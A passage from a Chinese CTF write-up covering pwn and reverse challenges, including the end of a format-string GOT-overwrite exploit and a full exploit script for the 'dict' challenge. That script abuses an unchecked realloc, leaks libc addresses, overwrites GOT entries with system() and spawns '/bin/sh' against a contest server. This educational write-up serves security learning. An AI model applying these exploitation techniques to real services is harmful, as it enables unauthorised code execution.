         break_point = text_addr + 0x0000081D
         print "fgets_got_addr:", hex(fgets_got_addr)
         print "break_point:", hex(break_point)
         print "system_real_addr:", hex(system_real_addr)
         io.gdb_hint()
         io.read_until("Your Message: ")
         data = "hello"
         io.write(data + "\n")
         addr = l32(fgets_got_addr) + l32(fgets_got_addr + 1) + l32(fgets_got_addr + 2) + l32(fgets_got_addr + 3)
         now_index = 9
         system_real_str = l32(system_real_addr)
         total_buff = "/bin/sh;" + addr
         now_pos = len(total_buff)
         for i in range(4):
                   now_value = (system_real_addr &gt;&gt; (i*8)) &amp; 0xff
                   print "now_value:", hex(now_value)
                   pad_count = 0
                   if now_value &gt; now_pos:
                            pad_count = now_value - now_pos
                   else:
                            pad_count = 0x100 - (now_pos&amp;0xff) + now_value
                   now_pos += pad_count
                   print "now_pos:", hex(now_pos)
                   print "pad_count:", hex(pad_count)
                   data = "%%%dc%%%d$hhn"%(pad_count, now_index)
                   now_index += 1
                   total_buff += data
         print total_buff
         io.write(total_buff + "\n")
         io.interact()
io = get_io(target)
pwn(io)

</pre>
<p>flag如下:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/41.png"><img class="alignnone size-full wp-image-39421" src="http://www.secpulse.com/wp-content/uploads/2015/10/41.png" alt="4" width="253" height="73" /></a></p>
<p>&nbsp;</p>
<h3>dict (400)</h3>
<p>这个题目漏洞发现的比较早,但是构造利用的时候花的时间比较长。</p>
<p>漏洞的位置在条件新单词的时候,使用realloc函数申请内存,但是没有检查是否申请成功,如下:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/5.png"><img class="alignnone size-full wp-image-39422" src="http://www.secpulse.com/wp-content/uploads/2015/10/5.png" alt="5" width="916" height="198" /></a></p>
<p>&nbsp;</p>
<p>假设申请内存特别大,此时realloc返回0,此时count为正数,也会进入读数据的循环中,在读数据之前,计算了存储的起始地址:</p>
<p>v1 = (char *)(0x20 * (count_before + j) + dict_info_804A0C4[index].buff);</p>
<p>若此时buff为0,那么v1的值就是(0x20 * (count_before + j),那么此时就只与前面的数量相关了, 发生任意写(地址为32的整数倍),为了实现任意读,其实可以在这里进行灵活控制来设置,将v1指向0x804a0c0(也就是全局存储结构体count,ptr变量的位置),这个刚好也为32的整数倍,将其buff的值进行覆盖,改成got表,就可以泄露地址,而且可以在增加的时候,进行地址覆盖,覆盖时候可以多覆盖几个count和buff这样就可以实现不同功能的地址引用。有的用于泄露,有的用于改写,因为地址没法重复利用。</p>
<p>利用方法:</p>
<p>1.申请6个字典</p>
<p>2.往字典1中添加4203782个单词,</p>
<p>#0x0804a0c0/0x20</p>
<p>count_to_node0 = 4203782</p>
<p>3.在申请0x0f101010个单词,发生realloc失败,填写全局变量0x804a0c0中的数据</p>
<p>4.分别泄露atoi,puts,memset(本来常理泄露一个就行,用libcdatabase就可以找到,但是有的不同libc中system地址根据偏移计算是对的,但是其他小函数计算就老是不对,在这里全泄露出来)</p>
<p>5.计算system地址,从 puts的got表开始覆盖,直至覆盖到atoi,puts和memset函数需要正确填写,因为后面还有用到:</p>
<p><a href="http://p2.qhimg.com/t01e75499466e78d7e2.png" target="_blank"><img title="t01f52bc921af0169b7.png" src="http://p2.qhimg.com/t01e75499466e78d7e2.png" alt="http://p8.qhimg.com/t01f52bc921af0169b7.png" /></a></p>
<p>6.在输入选择的时候,直接传“/bin/sh;”就可以拿到shell了。</p>
<p>代码如下:</p>
<pre>__author__ = "pxx"
from zio import *
import struct
target = "./dict"
target = ("202.120.7.146", 9992)#
def get_io(target):
         io = zio(target, timeout = 9999)
         return io
def full_buff(cur_data, length, ch_t = 'a'):
         len_t = length - len(cur_data)
         return cur_data + ch_t * len_t
def create_dict(io, count, value_list):
         io.read_until("$ ")
         io.write("1\n")
         io.read_until("dict: ")
         io.write(str(count) + "\n")
         for index, item in enumerate(value_list):
                   io.read_until("%d:"%index)
                   io.write(item)
def add_new_words(io, index, count, value_list, yes_sign = True):
         io.read_until("$ ")
         io.write("2\n")
         io.read_until("dict: ")
         io.write(str(index) + "\n")
         io.read_until("add? ")
         io.write(str(count) + "\n")
         for index, item in enumerate(value_list):
                   io.read_until("Input new word %d: "%index)
                   print "send one", len(item)
                   length = len(item)
                   if length &gt; 10000 and yes_sign:
                            index = 0
                            sign = False
                            add_count = 50000
                            while index &lt; length:
                                     print index
                                     io.write(item[index:index+add_count])
                                     index += add_count
                                     if index &gt; length:
                                               index = length
                                               sign = True
                                     else:
                                               io.read_until("Input new word %d: "%(index/2 - 1))
                            io.read_until("Input new word %d: "%(index/2 - 1))       
                   else:
                            io.write(item)
def view_words(io, index):
         io.read_until("$ ")
         io.write("3\n")
         io.read_until("dict: ")
         io.write(str(index) + "\n")
def pwn(io):     
         puts_got_addr = 0x0804a020
         atoi_got_addr = 0x0804a038
         memset_got_addr = 0x0804a034
         len_to_write = atoi_got_addr - puts_got_addr
         value_list = [];
         value_list.append("\n")
         #0x0804a020/0x20
         count_to_puts = 4203777
         #0x0804a0c0/0x20
         count_to_node0 = 4203782
         #0x0804a0e0/0x20
         count_to_node4 = 4203783
         #count_to_node0 = 20000
         create_dict(io, 1, value_list)#0
         create_dict(io, 1, value_list)#1
         create_dict(io, 1, value_list)#2
         create_dict(io, 1, value_list)#3
         create_dict(io, 1, value_list)#4
         create_dict(io, 1, value_list)#5
         value_list = []
         for i in xrange(count_to_node0):
                   value_list.append("8\n")
         add_new_words(io, 0, count_to_node0, ["".join(value_list)])
         value_list = []
                              #node0-&gt;count + ptr + node1-&gt;count + ptr
         payload = ""
         payload += l32(0x1) + l32(0) #0  can't move
         payload += l32(0x1) + l32(atoi_got_addr) #1 show
         payload += l32(count_to_puts) + l32(0x0) #2 add
         value_list.append(payload +"\n")
         payload = ""
         payload += l32(0x1) + l32(puts_got_addr) #4 show
         payload += l32(0x1) + l32(memset_got_addr) #5 show
         value_list.append(payload +"\n")
         value_list.append("\n")
         add_new_words(io, 0, 0x0f101010, value_list, False)
         #print value_list
         view_words(io, 1)
         io.read_until("1: ")
         data = io.read(4)
         print [c for c in data]
         atoi_real_addr = l32(data)
         print "atoi_real_addr:", hex(atoi_real_addr)
         view_words(io, 4)
         io.read_until("1: ")
         data = io.read(4)
         print [c for c in data]
         puts_real_addr = l32(data)
         print "puts_real_addr:", hex(puts_real_addr)
         view_words(io, 5)
         io.read_until("1: ")
         data = io.read(4)
         print [c for c in data]
         memset_real_addr = l32(data)
         print "memset_real_addr:", hex(memset_real_addr)
         #local
         offset_atoi = 0x0002fbb0
         offset_system = 0x0003e800
         #offset_puts = 0x000656a0
         #offset_memset = 0x0007c680
         #remote
         offset_atoi = 0x00031860
         offset_system = 0x00040190
         is_know = True
         if is_know == False:
                   offset_atoi = int(raw_input("atoi_off_set:"), 16)
                   offset_system = int(raw_input("system_off_set:"), 16)
                   #offset_puts = int(raw_input("puts_offset:"), 16)
                   #offset_memset = int(raw_input("memset_offset:"), 16)
         libc_real_addr = atoi_real_addr - offset_atoi
         system_real_addr = libc_real_addr + offset_system
         #puts_real_addr = libc_real_addr + offset_puts
         #memset_real_addr = libc_real_addr + offset_memset
         value_list = []
         payload = ""
         payload += l32(puts_real_addr) + 'a' * (len_to_write - 8) + l32(memset_real_addr) + l32(system_real_addr) #4
         value_list.append(payload +"\n")
         value_list.append("\n")
         print "begin to send useful data"
         add_new_words(io, 2, 0x0f101010, value_list, False)
         print "end to send useful data end"
         io.read_until("$ ")
         io.write("/bin/sh;\n")
         io.interact()
io = get_io(target)
pwn(io)
</pre>
<p>flag如下:</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h2>Reverse</h2>
<h3><a href="http://www.secpulse.com/wp-content/uploads/2015/10/6.png"><img class="alignnone size-full wp-image-39423" src="http://www.secpulse.com/wp-content/uploads/2015/10/6.png" alt="6" width="221" height="178" /></a>(100)</h3>
<p>该程序的逻辑就是在磁盘上搜索文件,找到一个文件的md5值为target值时,会计算其相应的sha1256的值,据此生成flag,代码如下:</p>
<pre>private static byte[] target = new byte[] { 0x6c, 0xcb, 0x61, 0x45, 90, 0xd8, 0x92, 0x19, 0x90, 0x2b, 0x3a, 0xf6, 10, 0x9a, 0x2d, 0x1c };
</pre>
<pre>Console.WriteLine("Analyzing " + file.FullName + " ...");
MD5CryptoServiceProvider provider = new MD5CryptoServiceProvider();
if (provider.ComputeHash(file.OpenRead()).SequenceEqual(target))
{
    SHA256CryptoServiceProvider provider2 = new SHA256CryptoServiceProvider();
Console.WriteLine("We've found the flag on your hard drive:");
Console.WriteLine("ISG{" + BitConverter.ToString(provider2.ComputeHash(file.OpenRead())).ToLower() + "}");
    Environment.Exit(0);
}
</pre>
<p>直接找文件肯定不行,解决方法是,计算md5后,google一下,找到网站上面有,如下:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/8.png"><img class="alignnone size-full wp-image-39425" src="http://www.secpulse.com/wp-content/uploads/2015/10/8.png" alt="8" width="784" height="152" /></a></p>
<p>&nbsp;</p>
<p>将其sha256,带入,计算的结果:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/7.png"><img class="alignnone size-full wp-image-39424" src="http://www.secpulse.com/wp-content/uploads/2015/10/7.png" alt="7" width="640" height="92" /></a></p>
<p>&nbsp;</p>
<h3>tlc (150)</h3>
<p>分析程序,首先输入12字节,然后rot13,然后base64解码,然后做了一个判断(高n位能被n整除),最后用输入作为密钥解密一段数据,得到flag。</p>
<p>但是满足高n位能被n整除的数很多,于是爆破。</p>
<p>根据base64后数据位12字节,原始的数可能的位数为7,8,9。(先试的8和7都不行,最后才试的9)</p>
<p>首先生成满足高n位能被n整除的数据:</p>
<pre>#include 
using namespace std;
int main()
{
    int i,j,temp;
    for (i=0;i&lt;=1000000000;i++)     {         temp=i;         for (j=9;j&gt;1;j--)
        {
            if (temp % j == 0)
            {
                temp=temp/10;
                continue;
            }
            else
            {
                break;
            }
        }
        if (j==1)
        {
            cout&lt;&lt;i&lt;&lt;endl;
         } 
    }
 }
</pre>
<p>运行tlc得到程序输出</p>
<pre>import base64
from zio import *
target = './tlc'
def rot13(s):
    d = {chr(i+c): chr((i+13)%26+c) for i in range(26) for c in (65,97)}
    return ''.join([d.get(c,c) for c in s])
def exp(target, s):
    #io = zio(target, timeout=10000, print_read=COLORED(REPR, 'red'), print_write=COLORED(REPR, 'green'))
    io = zio(target, timeout=10000, print_read=COLORED(NONE, 'red'), print_write=COLORED(NONE, 'green'))
    io.read_until(":")
    io.writeline(s)
    io.read_until(':')
    print io.readline().strip('\n')
    io.close()
f  = open('./len9.txt', 'r')
for line in f:
    line = line.strip().rjust(9, '0')
    if line != '':
        print line
        exp(target,rot13(base64.encodestring(line)))
</pre>
<p>在输出中搜索ISG发现,数为381654729时,输出flag。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/9.png"><img class="alignnone size-full wp-image-39426" src="http://www.secpulse.com/wp-content/uploads/2015/10/9.png" alt="9" width="487" height="59" /></a></p>
<p>&nbsp;</p>
<h3>是男人就下一百层 (300)</h3>
<p>分析程序,只有一个start函数,无数行汇编代码。功能很简单,让输入数据,然后对数据进行8字节逐个比较,最后如果都满足,用jmp rsp执行刚才输入的数据。</p>
<pre>.text:0000000001092509                 mov     al, [rsp+3B98E4h]
.text:0000000001092510                 xor     al, 0FFh
.text:0000000001092512                 jnz     short loc_1092516
.text:0000000001092514                 jmp     rsp
</pre>
<p>本来想用ida提取汇编代码,不过ida分析实在太慢了,于是用了一个反汇编库,生成汇编代码。</p>
<pre>import capstone
target = './onion'
f = open(target, 'rb')
CODE = f.read()[0x157:0x1092509-0x400000]
#CODE = f.read()[0x157:0x157+0x100]
f.close()
md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
for i in md.disasm(CODE, 0x400157):
    #print i.mnemonic
    #print i.op_str
print "0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str)

</pre>
<p>提取出汇编中mov rbx,imm中立即数的值,组合作为输入。</p>
<pre>f = open('a.txt', 'rb')
payload = ''
for line in f:
    if 'movabs' in line:
        value = line.split(',')[1].strip()
        if value.startswith('-'):
            d = int(value, 16) + 0xffffffffffffffff + 1
        else:
            d = int(value, 16)
        payload += l64(d)
payload += '\xff'*5
f.close()
f = open('b.txt', 'wb')
f.write(payload)
f.close()
</pre>
<p>这样求出来的只是过了第一层,后面层的方法类似。最后解到9层,看到一段赋值的汇编码,提取出来就是flag。</p>
<pre>d = '''
0x17b:  mov byte ptr [rsp], 0x54
0x17f:  mov byte ptr [rsp + 1], 0x68
0x184:  mov byte ptr [rsp + 2], 0x65
0x189:  mov byte ptr [rsp + 3], 0x20
0x18e:  mov byte ptr [rsp + 4], 0x66
0x193:  mov byte ptr [rsp + 5], 0x6c
0x198:  mov byte ptr [rsp + 6], 0x61
0x19d:  mov byte ptr [rsp + 7], 0x67
0x1a2:  mov byte ptr [rsp + 8], 0x20
0x1a7:  mov byte ptr [rsp + 9], 0x69
0x1ac:  mov byte ptr [rsp + 0xa], 0x73
0x1b1:  mov byte ptr [rsp + 0xb], 0x20
0x1b6:  mov byte ptr [rsp + 0xc], 0x49
0x1bb:  mov byte ptr [rsp + 0xd], 0x53
0x1c0:  mov byte ptr [rsp + 0xe], 0x47
0x1c5:  mov byte ptr [rsp + 0xf], 0x7b
0x1ca:  mov byte ptr [rsp + 0x10], 0x47
0x1cf:  mov byte ptr [rsp + 0x11], 0x31
0x1d4:  mov byte ptr [rsp + 0x12], 0x76
0x1d9:  mov byte ptr [rsp + 0x13], 0x33
0x1de:  mov byte ptr [rsp + 0x14], 0x5f
0x1e3:  mov byte ptr [rsp + 0x15], 0x79
0x1e8:  mov byte ptr [rsp + 0x16], 0x30
0x1ed:  mov byte ptr [rsp + 0x17], 0x55
0x1f2:  mov byte ptr [rsp + 0x18], 0x5f
0x1f7:  mov byte ptr [rsp + 0x19], 0x4d
0x1fc:  mov byte ptr [rsp + 0x1a], 0x59
0x201:  mov byte ptr [rsp + 0x1b], 0x5f
0x206:  mov byte ptr [rsp + 0x1c], 0x4f
0x20b:  mov byte ptr [rsp + 0x1d], 0x6e
0x210:  mov byte ptr [rsp + 0x1e], 0x31
0x215:  mov byte ptr [rsp + 0x1f], 0x30
0x21a:  mov byte ptr [rsp + 0x20], 0x6e
0x21f:  mov byte ptr [rsp + 0x21], 0x5f
0x224:  mov byte ptr [rsp + 0x22], 0x68
0x229:  mov byte ptr [rsp + 0x23], 0x33
0x22e:  mov byte ptr [rsp + 0x24], 0x34
0x233:  mov byte ptr [rsp + 0x25], 0x72
0x238:  mov byte ptr [rsp + 0x26], 0x37
0x23d:  mov byte ptr [rsp + 0x27], 0x7d
0x242:  mov byte ptr [rsp + 0x28], 0xa
0x247:  mov byte ptr [rsp + 0x29], 0
'''
aaa = ''
for a in d.split('\n'):
    if ',' in a:
        aaa += chr(int(a.split(',')[1],16))
print aaa
</pre>
<p>输出:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/10.png"><img class="alignnone size-full wp-image-39427" src="http://www.secpulse.com/wp-content/uploads/2015/10/10.png" alt="10" width="597" height="59" /></a></p>
<p>&nbsp;</p>
<h3>Poppy (350)</h3>
<p>第一次在ctf中遇到mac程序,这是在欺负穷人。所以最开始基本是一直在静态看,只有最后才用土豪队友的mac本运行得到flag。</p>
<p>首先看程序,感觉就是标准的crackme,然后陷入了出题人的陷阱中,去分析前面的变换算法。</p>
<p><a href="http://p1.qhimg.com/t016be5f8037ad6d4b1.png" target="_blank"><img title="t016cb5125d3d6224d4.png" src="http://p1.qhimg.com/t016be5f8037ad6d4b1.png" alt="http://p6.qhimg.com/t016cb5125d3d6224d4.png" /></a></p>
<p>变换算法是经过混淆的,有同或、异或啥的,最后化解如下:</p>
<pre>v12 = 0x476E614B
v11 = 0x306F7261
v10 = 0x47475349 &lt;&lt; 6 for i in range(64):     v11 = v11 - ((a+(v12&gt;&gt;5)) ^ (v12+v10)^(b+16*v12))
    v12 = v12 - ((c+(v11&gt;&gt;5) )^ ((v10+v11)^(d+16*v11)))
    v10 -= 0x47475349
need (v12 == 0x8906C3AD)
need (v11 == 0x0B442F5FC)

</pre>
<p>TEA加密算法,知道明文、密文,求key。不会。</p>
<p>后来 发现后面还有点代码,反正没事,就看看了。</p>
<p><a href="http://p6.qhimg.com/t014e8cdabbeef8fd5e.png" target="_blank"><img title="t010544f2db97ad2e39.png" src="http://p6.qhimg.com/t014e8cdabbeef8fd5e.png" alt="http://p5.qhimg.com/t010544f2db97ad2e39.png" /></a></p>
<p>在sub_100001530中,首先用输入的前6个字节与程序中的数据异或生成了一个url。url的开头肯定是http://或者<a href="https://xn--%2C%2C6-2h9dkb974a03abtp22bbk1chuzajzmkj5d/">https://,基于此,算出了输入的前6</a>个字节。求得前6个字节为T0mato,解出来的url为<a href="https://ctftime.org/event/">https://ctftime.org/event/</a>。</p>
<p>后面程序进入一个18次的循环,每次去访问ctftime的一个页面,然后调用了一个控制流混淆过的函数。</p>
<p>混淆函数没完全看明白,大概猜测是获取某行的第某个字节。</p>
<p>想到题目中说flag为ISG{未输出的内容},v2为char型,循环了18次,比较可能跟flag有关。</p>
<p><a href="http://p9.qhimg.com/t013355ab0e5213f6da.png" target="_blank"><img title="t01fa336a4acfeb4736.png" src="http://p9.qhimg.com/t013355ab0e5213f6da.png" alt="http://p9.qhimg.com/t01fa336a4acfeb4736.png" /></a></p>
<p>后面就用mac本进行调试了,直接在sub_100001330函数返回处下断点,查看每次的eax值,组合起来就是flag。(因网络问题,有时返回的可能为0,需要重跑)。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/111.png"><img class="alignnone size-large wp-image-39428" src="http://www.secpulse.com/wp-content/uploads/2015/10/111-1024x444.png" alt="11" width="1024" height="444" /></a></p>
<p>&nbsp;</p>
<p>Flag为ISG{whatAb0uTacupoFte4}</p>
<p>Ps:论有mac本的重要性。</p>
<h3>RPG (400)</h3>
<p>分析发现是用rpg maker xp制作出来的游戏,于是下载了该软件。在game目录下放一个Game.rxproj,文件中内容为“RPGXP 1.03”,然后可以打开工程了。</p>
<p>Rpg maker xp中支持脚本,ruby语法的,然后花了些时间学习怎么用脚本。最后写了个程序提取出地图信息,主要就是用game_player.passable?(x,y, d)判断是否通行。</p>
<p>Rpg中运行脚本很容易卡死,这里需要分多次提取地图信息。</p>
<pre>file1 = File.new("path.info", "ab+")
    
    i = 1
    str = String.new
    while i &lt; 498 do
      str = ""
      j = 1
      while j &lt; 498 do
        a = $game_player.passable?(j,i,2)?1:0
        a += $game_player.passable?(j,i,4)?2:0
        a += $game_player.passable?(j,i,6)?4:0
        a +=  $game_player.passable?(j,i,8)?8:0
        str &lt;&lt; a
        j += 1
      end
      file1.write(str)
      i += 1
end
</pre>
<p>得到地图信息后,用A*算法求路径。</p>
<pre>import math
#地图
tm = [
'############################################################',
'#..........................................................#',
'#.............................#............................#',
'#.............................#............................#',
'#.............................#............................#',
'#.......S.....................#............................#',
'#.............................#............................#',
'#.............................#............................#',
'#.............................#............................#',
'#.............................#............................#',
'#.............................#............................#',
'#.............................#............................#',
'#.............................#............................#',
'#######.#######################################............#',
'#....#........#............................................#',
'#....#........#............................................#',
'#....##########............................................#',
'#..........................................................#',
'#..........................................................#',
'#..........................................................#',
'#..........................................................#',
'#..........................................................#',
'#...............................##############.............#',
'#...............................#........E...#.............#',
'#...............................#............#.............#',
'#...............................#............#.............#',
'#...............................#............#.............#',
'#...............................###########..#.............#',
'#..........................................................#',
'#..........................................................#',
'############################################################']
tm = [
'############################################################',
'#..........................................................#',
'#.............................#............................#',
'#.......S.....................#............................#',
'#...............................##############.............#',
'#...............................#........E...#.............#',
'#...............................#............#.............#',
'#...............................###########..#.............#',
'#..........................................................#',
'############################################################']
#因为python里string不能直接改变某一元素,所以用test_map来存储搜索时的地图
test_map = []
#########################################################
class Node_Elem:
    """
    开放列表和关闭列表的元素类型,parent用来在成功的时候回溯路径
    """
    def __init__(self, parent, x, y, dist):
        self.parent = parent
        self.x = x
        self.y = y
        self.dist = dist
        
class A_Star:
    """
    A星算法实现类
    """
    #注意w,h两个参数,如果你修改了地图,需要传入一个正确值或者修改这里的默认参数
    def __init__(self, s_x, s_y, e_x, e_y, w=60, h=30):
        self.s_x = s_x
        self.s_y = s_y
        self.e_x = e_x
        self.e_y = e_y
        
        self.width = w
        self.height = h
        
        self.open = []
        self.close = []
        self.path = []
        
    #查找路径的入口函数
    def find_path(self):
        #构建开始节点
        p = Node_Elem(None, self.s_x, self.s_y, 0.0)
        while True:
            #扩展F值最小的节点
            self.extend_round(p)
            #如果开放列表为空,则不存在路径,返回
            if not self.open:
                return
            #获取F值最小的节点
            idx, p = self.get_best()
            #找到路径,生成路径,返回
            if self.is_target(p):
                self.make_path(p)
                return
            #把此节点压入关闭列表,并从开放列表里删除
            self.close.append(p)
            del self.open[idx]
            
    def make_path(self,p):
        #从结束点回溯到开始点,开始点的parent == None
        while p:
            self.path.append((p.x, p.y))
            p = p.parent
        
    def is_target(self, i):
        return i.x == self.e_x and i.y == self.e_y
        
    def get_best(self):
        best = None
        bv = 100000000 #如果你修改的地图很大,可能需要修改这个值
        bi = -1
        for idx, i in enumerate(self.open):
            value = self.get_dist(i)#获取F值
            if value &lt; bv:#比以前的更好,即F值更小                 best = i                 bv = value                 bi = idx         return bi, best              def get_dist(self, i):         # F = G + H         # G 为已经走过的路径长度, H为估计还要走多远         # 这个公式就是A*算法的精华了。         return i.dist + math.sqrt(             (self.e_x-i.x)*(self.e_x-i.x)             + (self.e_y-i.y)*(self.e_y-i.y))*1.2              def extend_round(self, p):         #可以从8个方向走         #xs = (-1, 0, 1, -1, 1, -1, 0, 1)         #ys = (-1,-1,-1,  0, 0,  1, 1, 1)         #只能走上下左右四个方向         xs = (0, -1, 1, 0)         ys = (-1, 0, 0, 1)         for x, y in zip(xs, ys):             new_x, new_y = x + p.x, y + p.y             #无效或者不可行走区域,则勿略             if not self.is_valid_coord(new_x, new_y):                 continue             #构造新的节点             node = Node_Elem(p, new_x, new_y, p.dist+self.get_cost(                         p.x, p.y, new_x, new_y))             #新节点在关闭列表,则忽略             if self.node_in_close(node):                 continue             i = self.node_in_open(node)             if i != -1:                 #新节点在开放列表                 if self.open[i].dist &gt; node.dist:
                    #现在的路径到比以前到这个节点的路径更好~
                    #则使用现在的路径
                    self.open[i].parent = p
                    self.open[i].dist = node.dist
                continue
            self.open.append(node)
            
    def get_cost(self, x1, y1, x2, y2):
        """
        上下左右直走,代价为1.0,斜走,代价为1.4
        """
        if x1 == x2 or y1 == y2:
            return 1.0
        return 1.4
        
    def node_in_close(self, node):
        for i in self.close:
            if node.x == i.x and node.y == i.y:
                return True
        return False
        
    def node_in_open(self, node):
        for i, n in enumerate(self.open):
            if node.x == n.x and node.y == n.y:
                return i
        return -1
        
    def is_valid_coord(self, x, y):
        if x &lt; 0 or x &gt;= self.width or y &lt; 0 or y &gt;= self.height:
            return False
        #print y, x, len(test_map)
        return test_map[y][x] != '#'
    
    def get_searched(self):
        l = []
        for i in self.open:
            l.append((i.x, i.y))
        for i in self.close:
            l.append((i.x, i.y))
        return l
        
#########################################################
def print_test_map():
    """
    打印搜索后的地图
    """
    for line in test_map:
        print ''.join(line)
def get_start_XY():
    return get_symbol_XY('S')
    
def get_end_XY():
    return get_symbol_XY('E')
    
def get_symbol_XY(s):
    for y, line in enumerate(test_map):
        try:
            x = line.index(s)
        except:
            continue
        else:
            break
    #print x, y
    #raw_input(":")
    return x, y
        
#########################################################
def mark_path(l):
    mark_symbol(l, '*')
    
def mark_searched(l):
    mark_symbol(l, ' ')
    
def mark_symbol(l, s):
    for x, y in l:
        test_map[y][x] = s
    
def mark_start_end(s_x, s_y, e_x, e_y):
    test_map[s_y][s_x] = 'S'
    test_map[e_y][e_x] = 'E'
    
def tm_to_test_map():
    print list("nihao")
    raw_input(":")
    for line in tm:
        test_map.append(list(line))
    #print test_map
    raw_input(":")
step_map = {(-1, 0):"a", (1, 0):"d", (0,-1):"w", (0, 1):"s"}
def getway(l, start, end):
    #print start
    #print end
    #print l
    begin = start
    way = []
    for x, y in l[1:]:
        diff = (end[0] - x, end[1] - y)
        end = (x, y)
        #print diff
        way.append(step_map[diff])
    way = way[::-1]
    print "".join(way)
def find_path(s_x, s_y, e_x, e_y, w, h):
    #s_x, s_y = get_start_XY()
    #e_x, e_y = get_end_XY()
    a_star = A_Star(s_x, s_y, e_x, e_y, w, h)
    a_star.find_path()
    searched = a_star.get_searched()
    path = a_star.path
    #标记已搜索区域
    mark_searched(searched)
    #标记路径
    mark_path(path)
    print "path length is %d"%(len(path))
    print "searched squares count is %d"%(len(searched))
    #标记开始、结束点
    mark_start_end(s_x, s_y, e_x, e_y)
    return getway(path, (s_x, s_y), (e_x, e_y))
def build_my_map():
    file_r = open("path.info", 'r')
    data = file_r.read()
    file_r.close()
    map_info = []
    map_info.append(['#' for i in xrange(499)])
    index = 0
    for i in xrange(497):
        item = ['#']
        for j in xrange(497):
            #item.append(ord(data[index]))
            #"""
            if ord(data[index]) &amp; 0xf == 0:
                item.append('#')
            else:
                item.append('.')
            #"""
            index += 1
        item.append('#')
        map_info.append(item)
    map_info.append(['#' for i in xrange(499)])
    """
    little_map = []
    for item in map_info[:30+2]:
        little_map.append(item[:25+2])
    map_info = little_map
    #print len(map_info)
    """
    global test_map
    test_map = map_info
if __name__ == "__main__":
    #把字符串转成列表
    build_my_map()
    s_x, s_y = 1,1
    e_x, e_y = 497,497
    w, h = e_x + 2, e_y + 2
    find_path(s_x, s_y, e_x, e_y, w, h)
    #print_test_map()

</pre>
<p>得到路径如下:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/12.png"><img class="alignnone size-full wp-image-39429" src="http://www.secpulse.com/wp-content/uploads/2015/10/12.png" alt="12" width="677" height="699" /></a></p>
<p>&nbsp;</p>
<p>通过抓包发现,游戏将运行的路径按aswd发送给了服务器,最后到达终点时发送一个flag。如果作弊到达的,会发回no cheat。</p>
<pre>path = """
ddddddddddddssddddssssssssassdddddddddsddwwwddddwwwwwwwwwddsssssssdddssasssssssaawaaaassaassssddddssssdssaassddsssassssaawaaawwdwwwaaaawwaasssssddsssssssssddwww
dddssassssassdssssssaaassdddssddddssddddssdssaaaaassssssssssssaasaawwwwwaaassssssaaaaasaaaasaassssaaaawwaaaaaaassddddssssdddsddsssddddssdssaassdssssssddssddddssssdddssssdsssddwwwdwwawwwddsddddwwddwwddddwwdddwwawwaaawwdddwwdddssssdddssdddddwwaawwdddwddsssssddssssssaaaawwaaassdssddsddwddddssssssssssaaawwwwwawaaaaawaaasaassaassaaaawwaaaassssssssddddddwwwddsssddssssssddsssssssdddddsdddwwddddddddddsssdddwwwdddwwddwwwwddwddddddsssddddwwwwddwwwwwwddddssddssdssddssasssssddwwddsdssassaasssddwddddssssssddddwwwwwddsssssddddssddsddwwwawwwawaaawwdwwdddddddssssdddwwdddwwaaawwwwawwdddddwwddwwddwddssssssaaaasaaassdddddddddddssddsddwddddddddwddddwwddsssddddsssaaaasassssdsddwwwdddddssssdsddwwwdddsssdsssaassssaaassdddssddddddssssddddssssddsddddsddssssssssaaaaaawaasssddssdssssdsdddsdsssddddddwdwwaaaawwwwdddddwwddwwddwddsssaasssddwddwdwwwwwwwdwwwddsddddwdwwwwwaawwwwwwdddsssddwwwdddddwwwwdwwwddsssssddsssddwddddwwddddwwwwdddssssdddwwwddsssdddddssssssasaawwwwaasssaaassddssaaaassssaaaaassssdsssdsssssasssaaawaaaaassdddssddsssaawaaaaaaaassssddssddddddwddsssdssaaaawwaaasaaaasssdddddddsssaaasssddssdssaaawwaaaaassdddssssdssssdddddwwwwwddsssssssaaassdddddwwdwwwwdddddssddddddwwdddwwwwdddddwwwwaawwwwddwwdddsddddddddwdddwwdddssassassasssssddwwwddwwdddssssaassdddddddsddwdwwwwdwwwwddddwddsssssaassassdddddsssssssddwdddddwwwwdwddssdddddwdddssddddddddsddssddwwwwddsdddssasssssddwwddssddwwddwwwwddssssssddwwwwwwwddwwdddssassssssdddsdddsddddddddssssdssssaaaaassssssssassdddssssdssssdssssddsssssddwwddssddwddwddsddddsssssaawwaasaaaasaaaasssdddssssddddwwwwdddssssdssssdddwddsdssasaaaasaaaaaaassdddddddddsddwddwddddddsdddddddddwwaaaawwaaaaaaaawwdddwwwddssddwwwwddsdssssdddwwddwdwwwwwaawwaaaawwdddddddddddwwwddsssssaaassdsddddsddddddddddsddwwwaaaaaaawwdddddwddsddssssssddddwwwwwwddwwdddddddssassssdsssdsssssassdssssssassdddssdddssaaaaaaawaasssssssddddddwddsssddddddwddsdssssdddsssddwwwdddssssddddddwwdwwwwddddsddddsssssddddssddssdssassssdssaaasssssssddsdddwwwwdddssssssssaaaaaaaawwaawwwwwwwwaawwwwwaassssaaaasaassssdddddwwdddssssssaaaassssdssassaasssaaaawwwaaassdssssddddsssddwwddsssddddddssdssaaawaaaawaaaaaasaawwaasssssssdsssdddddsddssdssdddssssaassssaassaasaaawaaassssdssddssaaaaaaaawwddwwaaaaasssssaawaaaaaaaasssssddwddddssssssaassssssdddsssdddsddssssssssssssdddsssdsddddwwddwwwddssddddwdddssassaaaasssaawaaaaaaaasssddwdddssasssddddsddddssddddsddssddwwwwwwaaaawwwwddddwwwddwddsssssssssassssdddddddddsssaawaaaaassssaaawaassssddddddddddsssssassdddssssssssssssaasssddddsssssaasssddwdddssassssddddsddddddsssssssaassaaaaaassaaaaaaawwwawaawwaaassdssssssddddddsddwddddsddwwddssdddds"""
path = path.replace("\n", "")
from zio import *
target = ('202.120.7.132', 9999)
#target = './test'
def exp(target):
